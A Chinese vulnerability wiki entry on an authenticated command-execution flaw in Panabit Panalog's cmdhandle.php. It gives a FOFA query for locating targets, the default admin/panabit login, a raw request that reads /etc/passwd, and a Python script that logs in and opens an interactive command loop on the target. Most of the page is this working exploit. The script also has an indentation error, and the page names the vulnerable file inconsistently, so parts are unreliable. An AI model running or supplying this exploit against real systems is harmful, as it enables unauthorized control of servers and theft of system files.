# Panabit Panalog cmdhandle.php 后台命令执行漏洞

## 漏洞描述

Panabit Panalog cmdhandle.php 存在后台命令执行漏洞，攻击者可以登录后执行任意命令控制服务器

## 漏洞影响

> [!NOTE]
>
> Panabit Panalog

## FOFA

> [!NOTE]
>
> "Panalog"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/pa-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

默认账号密码为：**admin/panabit**

出现漏洞的文件为 **Maintain/command-html.php**， 请求包如下

```
POST /Maintain/cmdhandle.php HTTP/1.1
Host: 
Connection: close
Content-Length: 31
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: cloud_limit=20; cloud_left=block; PHPSESSID=9lpglosgab794j5ouvv0sg7q73

cmd=cat%2520%252Fetc%252Fpasswd
```

![](http://wikioss.peiqi.tech/vuln/pa-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## 漏洞POC

```python
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : Panabit Panalog cmdhandle.php 后台命令执行漏洞                   \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
        cookie = "PHPSESSID=111111111111111111111peiqi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie
    }
    data = "user=admin&mypass=panabit&sec=1619123700835.617&useldap=0"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/login.php.... \033[0m".format(target_url))
        if "yes" in response.text and "yn" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在默认口令 admin/panabit \033[0m".format(target_url))
            print("\033[36m[o] 设置Cookie : {} \033[0m".format(cookie))
            POC_2(target_url, cookie)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/Maintain/cmdhandle.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(Cookie)
    }
    data = "cmd=cat /etc/passwd"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url,data=data, headers=headers, verify=False, timeout=5)
        if 'root' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd >>> \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_3(target_url, Cmd, Cookie)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cmd, Cookie):
    Cmd = Cmd.replace(" ", "%20")
    vuln_url = target_url + "/Maintain/cmdhandle.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(Cookie)
    }
    data = "cmd={}".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5)
        response_data = response.text.replace("<br/>", "\n")
        print("\033[36m[o] 响应为:\n{} \033[0m".format(response_data))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](http://wikioss.peiqi.tech/vuln/pa-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)